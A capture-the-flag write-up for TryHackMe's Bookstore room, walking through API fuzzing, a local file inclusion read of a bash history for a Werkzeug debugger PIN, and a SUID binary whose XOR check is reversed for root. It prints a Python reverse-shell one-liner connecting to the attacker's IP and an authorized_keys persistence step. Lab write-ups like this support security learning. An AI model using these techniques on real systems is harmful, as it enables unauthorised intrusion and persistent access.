<h1>Writeup for Bookstore room on <a href='https://tryhackme.com'>TryHackMe</a></h1>

<h3>User Flag</h3>
Enumerate the IP with nmap
<br></br><img src='Screenshot (72).png'/><br></br>
We can see port 5000 which seems to be running a python server, we'll get back to that in a minute.
Let's enumerate the webserver first. There is nothing special about the webserver as in general. Even the login feature is nothing but a dud but if you look at the source code of the <b>login.html</b>,there is a hint.
<br></br><img src='Screenshot (73).png'/><br></br>
The debugger pin is in sid's bash history which would be <b>.bash_history</b><br></br>
Now we move to port 5000.
It is a REST Api and if you visit <b>/api</b> you can see all the available endpoints.
I tried to read the bash file with id, author and published query parameter but they did not work.
So I went back to the website and started the enumeration again and this time in /assests/js/api.js I saw the following comment
<h5>//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.</h5>
This indicates that we need to look for a parameter in the previous version. So now we need to change the version from v2 to v1 and look for a parameter.
<br></br>I used <b><a href='https://github.com/ffuf/ffuf'>FFUF</a></b> for this.
<br></br><img src='Screenshot (74).png'/><br></br>
We have the show parameter which we can use to get the pin. Now we can use the pin at <b>http://{MACHINE IP}:5000/console</b> (I was not aware of what Werkzeug was so I had to manually enumerate for the /console).
When you enter the pin you can access the console which executes python code.We can use that to get the shell, I used the python reverse shell for this but yuo are free to use any other shell
<h5>'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{YOUR IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")</h5>
WWith this we get the shell as user. Improve the shell by adding your ssh public key(present at ~/.ssh/id_rsa.pub) to <b>.ssh/authorized_keys</b> of the user sid, you need to create the .ssh folder first.
<h5>echo 'YOUR PUBLIC SSH KEY' > ~/.ssh/authorized_keys</h5>
After adding the keys you can login with your private key. You can create ssh keys with <b>ssh-keygen</b>, read more about it <a href='https://www.ssh.com/ssh/keygen/'>here</a>

<h3>Root</h3>
We can see a tryharder binary which has 's' bit set which means that we can run the binary as root. If you run the binary we can see that it asks us for a number and exits giving the message 'Incorrect Try Harder'. 
Lets copy the binary to our machine(Run the below command in your machine).
<h5>scp -i ~/.ssh/id_rsa sid@{MACHINE IP}:/home/sid/tryharder .</h5>
Now that we have the binary on our machine we can analyse the binary now.
Running strings against the binary shows us something very interesting.
<br></br><img src='Screenshot (76).png'/><br></br>
bash is running with -p to preserve the privileges of the root. Now we just need to find the magical number it is asking us. I opened the binary in ghidra and saw that our input was XORed with two values and then compared with a value, if it was equal it would run the bash command
<br></br><img src='Screenshot (77).png'/><br></br>
We can see that our input is being stored in <b>local_lc</b> variable and it is being XORed with hex value,  0x1116, and <b>local_l8</b>  varaiable with value, 0x5db3.
<br></br>
You can convert the hex values to decimal in Python Console.
<br></br><img src='Screenshot (78).png'/><br></br>

In XOR, if a ^ b ^ c = d then b ^ c ^ d = a (^ is xor. Also 0 ^ a = a and a ^ a = 0, you can use this property to understand the above statement. In the first equation XOR both sides with 'a' then the equation becomes b ^ c = d ^ a since a ^ a is 0 and anything XORed with 0 is the value itself. Now if you XOR both side with 'd' we will get b ^ c ^ d = a).
Now using this we will do, 23987 ^ 4374 ^ 1573724660 (1573724660 is the decimal value of 0x5dcd21f4 which is the hex value used in the comparision).
We will get the value we need, Now run the binary again, enter the value you get and that will give the root shell
